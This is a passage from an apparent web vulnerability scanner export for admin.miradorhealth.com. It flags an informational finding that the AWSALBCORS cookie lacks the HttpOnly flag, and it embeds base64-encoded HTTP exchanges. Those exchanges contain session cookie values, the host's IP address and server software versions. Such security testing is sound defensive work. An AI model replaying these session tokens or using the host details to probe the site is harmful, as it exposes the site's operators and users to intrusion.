      <request method="GET" base64="true"><![CDATA[R0VUIC9jc3Mvc2VsZWN0Mi5taW4uY3NzIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBBV1NBTEI9dXdaY2MxOEpRdFhLdGNmMzVrRnNTR083bTJ4d2FaNHJtNElrNlJiVEhkVlJCVXVTT1hTQlc1dUZ1Y3gydDJIcExkY2VoN0hidGM0S0hmZEk5T0JpUTVXWlA1WU5PTWJIZnR2V2NXQWxWbkxYdDlXajBScVBXeXZtM3RhRTsgQVdTQUxCQ09SUz11d1pjYzE4SlF0WEt0Y2YzNWtGc1NHTzdtMnh3YVo0cm00SWs2UmJUSGRWUkJVdVNPWFNCVzV1RnVjeDJ0MkhwTGRjZWg3SGJ0YzRLSGZkSTlPQmlRNVdaUDVZTk9NYkhmdHZXY1dBbFZuTFh0OVdqMFJxUFd5dm0zdGFFDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClNlYy1DaC1VYTogIkNocm9taXVtIjt2PSIxMzEiLCAiTm90X0EgQnJhbmQiO3Y9IjI0Ig0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KU2VjLUNoLVVhLU1vYmlsZTogPzANCkFjY2VwdDogdGV4dC9jc3MsKi8qO3E9MC4xDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBuby1jb3JzDQpTZWMtRmV0Y2gtRGVzdDogc3R5bGUNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTANCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7842356259484729344</serialNumber>
    <type>5244416</type>
    <name><![CDATA[Cookie without HttpOnly flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">Web Security Academy: Exploiting XSS vulnerabilities</a></li><li><a href="https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly">HttpOnly effectiveness</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li><li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li>AWSALBCORS</li></ul>The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.This issue was found in multiple locations under the reported path.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Other: AWSALBCORS]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9sb2dpbiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBBV1NBTEJDT1JTPVlYcjUvS1prcDFMRVVFS3BWUWEzaDRhTVgzVzd2bXU5RFhkYU9LZS9aL1JlZm14KzRld2M2QWZrc1NxL3dkeWZVdXU3QTZmRGl2WWJhbjQyWkh5MlFZYTU3d2tsbFRKNWN2NmpTUzF3WDY0c3dHNGFRU3liOGJJcXlHWkI7IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0cw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTAsIGkNCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MCwgaQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9WVhyNS9LWmtwMUxFVUVLcFZRYTNoNGFNWDNXN3ZtdTlEWGRhT0tlL1ovUmVmbXgrNGV3YzZBZmtzU3Evd2R5ZlV1dTdBNmZEaXZZYmFuNDJaSHkyUVlhNTd3a2xsVEo1Y3Y2alNTMXdYNjRzd0c0YVFTeWI4YklxeUdaQjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjI5OjA2IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9jc3Mvc2VsZWN0Mi5taW4uY3NzIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBBV1NBTEI9dXdaY2MxOEpRdFhLdGNmMzVrRnNTR083bTJ4d2FaNHJtNElrNlJiVEhkVlJCVXVTT1hTQlc1dUZ1Y3gydDJIcExkY2VoN0hidGM0S0hmZEk5T0JpUTVXWlA1WU5PTWJIZnR2V2NXQWxWbkxYdDlXajBScVBXeXZtM3RhRTsgQVdTQUxCQ09SUz11d1pjYzE4SlF0WEt0Y2YzNWtGc1NHTzdtMnh3YVo0cm00SWs2UmJUSGRWUkJVdVNPWFNCVzV1RnVjeDJ0MkhwTGRjZWg3SGJ0YzRLSGZkSTlPQmlRNVdaUDVZTk9NYkhmdHZXY1dBbFZuTFh0OVdqMFJxUFd5dm0zdGFFDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClNlYy1DaC1VYTogIkNocm9taXVtIjt2PSIxMzEiLCAiTm90X0EgQnJhbmQiO3Y9IjI0Ig0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KU2VjLUNoLVVhLU1vYmlsZTogPzANCkFjY2VwdDogdGV4dC9jc3MsKi8qO3E9MC4xDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBuby1jb3JzDQpTZWMtRmV0Y2gtRGVzdDogc3R5bGUNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTANCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9jc3MNCkNvbnRlbnQtTGVuZ3RoOiAxNTgyMw0KU2V0LUNvb2tpZTogQVdTQUxCPXJuZm5NTmVXMm1QQjBiV3FJUXQ1M08rWXJHb2pkdzRXVU5pN2pPaVhOenNFSEY1ZkRvSmEvZWNWVmhJQk9NZUNaMXBQcHVhNGYxY3BtZk1za1cyNlhVcWJ6VUlWL1ZvYzEveW4rT3BValRYTnlwaENMckxLekkzbDVoNlo7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzoyOTowNiBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1ybmZuTU5lVzJtUEIwYldxSVF0NTNPK1lyR29qZHc0V1VOaTdqT2lYTnpzRUhGNWZEb0phL2VjVlZoSUJPTWVDWjFwUHB1YTRmMWNwbWZNc2tXMjZYVXFielVJVi9Wb2MxL3luK09wVWpUWE55cGhDTHJMS3pJM2w1aDZaOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KTGFzdC1Nb2RpZmllZDogVGh1LCAxOCBKYW4gMjAyNCAwNzoxMjozMCBHTVQNCkV0YWc6ICIzZGNmLTYwZjMzMTYzMDFiNWMiDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KDQouc2VsZWN0Mi1jb250YWluZXJ7Ym94LXNpemluZzpib3JkZXItYm94O2Rpc3BsYXk6aW5saW5lLWJsb2NrO21hcmdpbjowO3Bvc2l0aW9uOnJlbGF0aXZlO3ZlcnRpY2FsLWFsaWduOm1pZGRsZX0uc2VsZWN0Mi1jb250YWluZXIgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGV7Ym94LXNpemluZzpib3JkZXItYm94O2N1cnNvcjpwb2ludGVyO2Rpc3BsYXk6YmxvY2s7aGVpZ2h0OjI4cHg7dXNlci1zZWxlY3Q6bm9uZTstd2Via2l0LXVzZXItc2VsZWN0Om5vbmV9LnNlbGVjdDItY29udGFpbmVyIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fcmVuZGVyZWR7ZGlzcGxheTpibG9jaztwYWRkaW5nLWxlZnQ6OHB4O3BhZGRpbmctcmlnaHQ6MjBweDtvdmVyZmxvdzpoaWRkZW47dGV4dC1vdmVyZmxvdzplbGxpcHNpczt3aGl0ZS1zcGFjZTpub3dyYXB9LnNlbGVjdDItY29udGFpbmVyIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2xlYXJ7YmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudDtib3JkZXI6bm9uZTtmb250LXNpemU6MWVtfS5zZWxlY3QyLWNvbnRhaW5lcltkaXI9InJ0bCJdIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fcmVuZGVyZWR7cGFkZGluZy1yaWdodDo4cHg7cGFkZGluZy1sZWZ0OjIwcHh9LnNlbGVjdDItY29udGFpbmVyIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGV7Ym94LXNpemluZzpib3JkZXItYm94O2N1cnNvcjpwb2ludGVyO2Rpc3BsYXk6YmxvY2s7bWluLWhlaWdodDozMnB4O3VzZXItc2VsZWN0Om5vbmU7LXdlYmtpdC11c2VyLXNlbGVjdDpub25lfS5zZWxlY3QyLWNvbnRhaW5lciAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxlIC5zZWxlY3QyLXNlbGVjdGlvbl9fcmVuZGVyZWR7ZGlzcGxheTppbmxpbmU7bGlzdC1zdHlsZTpub25lO3BhZGRpbmc6MH0uc2VsZWN0Mi1jb250YWluZXIgLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2NsZWFye2JhY2tncm91bmQtY29sb3I6dHJhbnNwYXJlbnQ7Ym9yZGVyOm5vbmU7Zm9udC1zaXplOjFlbX0uc2VsZWN0Mi1jb250YWluZXIgLnNlbGVjdDItc2VhcmNoLS1pbmxpbmUgLnNlbGVjdDItc2VhcmNoX19maWVsZHtib3gtc2l6aW5nOmJvcmRlci1ib3g7Ym9yZGVyOm5vbmU7Zm9udC1zaXplOjEwMCU7bWFyZ2luLXRvcDo1cHg7bWFyZ2luLWxlZnQ6NXB4O3BhZGRpbmc6MH0uc2VsZWN0Mi1jb250YWluZXIgLnNlbGVjdDItc2VhcmNoLS1pbmxpbmUgLnNlbGVjdDItc2VhcmNoX19maWVsZDo6LXdlYmtpdC1zZWFyY2gtY2FuY2VsLWJ1dHRvbnstd2Via2l0LWFwcGVhcmFuY2U6bm9uZX0uc2VsZWN0Mi1kcm9wZG93bntiYWNrZ3JvdW5kLWNvbG9yOndoaXRlO2JvcmRlcjoxcHggc29saWQgI2FhYTtib3JkZXItcmFkaXVzOjRweDtib3gtc2l6aW5nOmJvcmRlci1ib3g7ZGlzcGxheTpibG9jaztwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0Oi0xMDAwMDBweDt3aWR0aDoxMDAlO3otaW5kZXg6MTA1MX0uc2VsZWN0Mi1yZXN1bHRze2Rpc3BsYXk6YmxvY2t9LnNlbGVjdDItcmVzdWx0c19fb3B0aW9uc3tsaXN0LXN0eWxlOm5vbmU7bWFyZ2luOjA7cGFkZGluZzowfS5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbntwYWRkaW5nOjZweDt1c2VyLXNlbGVjdDpub25lOy13ZWJraXQtdXNlci1zZWxlY3Q6bm9uZX0uc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24tLXNlbGVjdGFibGV7Y3Vyc29yOnBvaW50ZXJ9LnNlbGVjdDItY29udGFpbmVyLS1vcGVuIC5zZWxlY3QyLWRyb3Bkb3due2xlZnQ6MH0uc2VsZWN0Mi1jb250YWluZXItLW9wZW4gLnNlbGVjdDItZHJvcGRvd24tLWFib3Zle2JvcmRlci1ib3R0b206bm9uZTtib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOjA7Ym9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6MH0uc2VsZWN0Mi1jb250YWluZXItLW9wZW4gLnNlbGVjdDItZHJvcGRvd24tLWJlbG93e2JvcmRlci10b3A6bm9uZTtib3JkZXItdG9wLWxlZnQtcmFkaXVzOjA7Ym9yZGVyLXRvcC1yaWdodC1yYWRpdXM6MH0uc2VsZWN0Mi1zZWFyY2gtLWRyb3Bkb3due2Rpc3BsYXk6YmxvY2s7cGFkZGluZzo0cHh9LnNlbGVjdDItc2VhcmNoLS1kcm9wZG93biAuc2VsZWN0Mi1zZWFyY2hfX2ZpZWxke3BhZGRpbmc6NHB4O3dpZHRoOjEwMCU7Ym94LXNpemluZzpib3JkZXItYm94fS5zZWxlY3QyLXNlYXJjaC0tZHJvcGRvd24gLnNlbGVjdDItc2VhcmNoX19maWVsZDo6LXdlYmtpdC1zZWFyY2gtY2FuY2VsLWJ1dHRvbnstd2Via2l0LWFwcGVhcmFuY2U6bm9uZX0uc2VsZWN0Mi1zZWFyY2gtLWRyb3Bkb3duLnNlbGVjdDItc2VhcmNoLS1oaWRle2Rpc3BsYXk6bm9uZX0uc2VsZWN0Mi1jbG9zZS1tYXNre2JvcmRlcjowO21hcmdpbjowO3BhZGRpbmc6MDtkaXNwbGF5OmJsb2NrO3Bvc2l0aW9uOmZpeGVkO2xlZnQ6MDt0b3A6MDttaW4taGVpZ2h0OjEwMCU7bWluLXdpZHRoOjEwMCU7aGVpZ2h0OmF1dG87d2lkdGg6YXV0bztvcGFjaXR5OjA7ei1pbmRleDo5OTtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7ZmlsdGVyOmFscGhhKG9wYWNpdHk9MCl9LnNlbGVjdDItaGlkZGVuLWFjY2Vzc2libGV7Ym9yZGVyOjAgIWltcG9ydGFudDtjbGlwOnJlY3QoMCAwIDAgMCkgIWltcG9ydGFudDstd2Via2l0LWNsaXAtcGF0aDppbnNldCg1MCUpICFpbXBvcnRhbnQ7Y2xpcC1wYXRoOmluc2V0KDUwJSkgIWltcG9ydGFudDtoZWlnaHQ6MXB4ICFpbXBvcnRhbnQ7b3ZlcmZsb3c6aGlkZGVuICFpbXBvcnRhbnQ7cGFkZGluZzowICFpbXBvcnRhbnQ7cG9zaXRpb246YWJzb2x1dGUgIWltcG9ydGFudDt3aWR0aDoxcHggIWltcG9ydGFudDt3aGl0ZS1zcGFjZTpub3dyYXAgIWltcG9ydGFudH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGV7YmFja2dyb3VuZC1jb2xvcjojZmZmO2JvcmRlcjoxcHggc29saWQgI2FhYTtib3JkZXItcmFkaXVzOjRweH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUgLnNlbGVjdDItc2VsZWN0aW9uX19yZW5kZXJlZHtjb2xvcjojNDQ0O2xpbmUtaGVpZ2h0OjI4cHh9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2xlYXJ7Y3Vyc29yOnBvaW50ZXI7ZmxvYXQ6cmlnaHQ7Zm9udC13ZWlnaHQ6Ym9sZDtoZWlnaHQ6MjZweDttYXJnaW4tcmlnaHQ6MjBweDtwYWRkaW5nLXJpZ2h0OjBweH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUgLnNlbGVjdDItc2VsZWN0aW9uX19wbGFjZWhvbGRlcntjb2xvcjojOTk5fS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Fycm93e2hlaWdodDoyNnB4O3Bvc2l0aW9uOmFic29sdXRlO3RvcDoxcHg7cmlnaHQ6MXB4O3dpZHRoOjIwcHh9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fYXJyb3cgYntib3JkZXItY29sb3I6Izg4OCB0cmFuc3BhcmVudCB0cmFuc3BhcmVudCB0cmFuc3BhcmVudDtib3JkZXItc3R5bGU6c29saWQ7Ym9yZGVyLXdpZHRoOjVweCA0cHggMCA0cHg7aGVpZ2h0OjA7bGVmdDo1MCU7bWFyZ2luLWxlZnQ6LTRweDttYXJnaW4tdG9wOi0ycHg7cG9zaXRpb246YWJzb2x1dGU7dG9wOjUwJTt3aWR0aDowfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdFtkaXI9InJ0bCJdIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2xlYXJ7ZmxvYXQ6bGVmdH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHRbZGlyPSJydGwiXSAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Fycm93e2xlZnQ6MXB4O3JpZ2h0OmF1dG99LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0LnNlbGVjdDItY29udGFpbmVyLS1kaXNhYmxlZCAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZXtiYWNrZ3JvdW5kLWNvbG9yOiNlZWU7Y3Vyc29yOmRlZmF1bHR9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0LnNlbGVjdDItY29udGFpbmVyLS1kaXNhYmxlZCAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2NsZWFye2Rpc3BsYXk6bm9uZX0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQuc2VsZWN0Mi1jb250YWluZXItLW9wZW4gLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUgLnNlbGVjdDItc2VsZWN0aW9uX19hcnJvdyBie2JvcmRlci1jb2xvcjp0cmFuc3BhcmVudCB0cmFuc3BhcmVudCAjODg4IHRyYW5zcGFyZW50O2JvcmRlci13aWR0aDowIDRweCA1cHggNHB4fS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxle2JhY2tncm91bmQtY29sb3I6d2hpdGU7Ym9yZGVyOjFweCBzb2xpZCAjYWFhO2JvcmRlci1yYWRpdXM6NHB4O2N1cnNvcjp0ZXh0O3BhZGRpbmctYm90dG9tOjVweDtwYWRkaW5nLXJpZ2h0OjVweH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2NsZWFye2N1cnNvcjpwb2ludGVyO2Zsb2F0OnJpZ2h0O2ZvbnQtd2VpZ2h0OmJvbGQ7aGVpZ2h0OjIwcHg7bWFyZ2luLXJpZ2h0OjEwcHg7bWFyZ2luLXRvcDo1cHg7cGFkZGluZzoxcHh9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2V7YmFja2dyb3VuZC1jb2xvcjojZTRlNGU0O2JvcmRlcjoxcHggc29saWQgI2FhYTtib3JkZXItcmFkaXVzOjRweDtkaXNwbGF5OmlubGluZS1ibG9jazttYXJnaW4tbGVmdDo1cHg7bWFyZ2luLXRvcDo1cHg7cGFkZGluZzowfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2hvaWNlX19kaXNwbGF5e2N1cnNvcjpkZWZhdWx0O3BhZGRpbmctbGVmdDoycHg7cGFkZGluZy1yaWdodDo1cHh9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2VfX3JlbW92ZXtiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50O2JvcmRlcjpub25lO2JvcmRlci1yaWdodDoxcHggc29saWQgI2FhYTtib3JkZXItdG9wLWxlZnQtcmFkaXVzOjRweDtib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOjRweDtjb2xvcjojOTk5O2N1cnNvcjpwb2ludGVyO2ZvbnQtc2l6ZToxZW07Zm9udC13ZWlnaHQ6Ym9sZDtwYWRkaW5nOjAgNHB4fS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2hvaWNlX19yZW1vdmU6aG92ZXIsLnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2VfX3JlbW92ZTpmb2N1c3tiYWNrZ3JvdW5kLWNvbG9yOiNmMWYxZjE7Y29sb3I6IzMzMztvdXRsaW5lOm5vbmV9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0W2Rpcj0icnRsIl0gLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Nob2ljZXttYXJnaW4tbGVmdDo1cHg7bWFyZ2luLXJpZ2h0OmF1dG99LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0W2Rpcj0icnRsIl0gLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aX